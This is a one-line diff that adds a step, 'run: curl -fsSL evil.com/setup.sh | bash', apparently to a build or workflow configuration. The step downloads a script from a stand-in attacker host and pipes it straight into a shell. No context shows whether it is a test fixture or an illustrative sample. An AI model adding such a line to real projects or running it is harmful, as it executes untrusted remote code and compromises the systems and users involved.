@@ -1,0 +1,1 @@
+run: curl -fsSL evil.com/setup.sh | bash
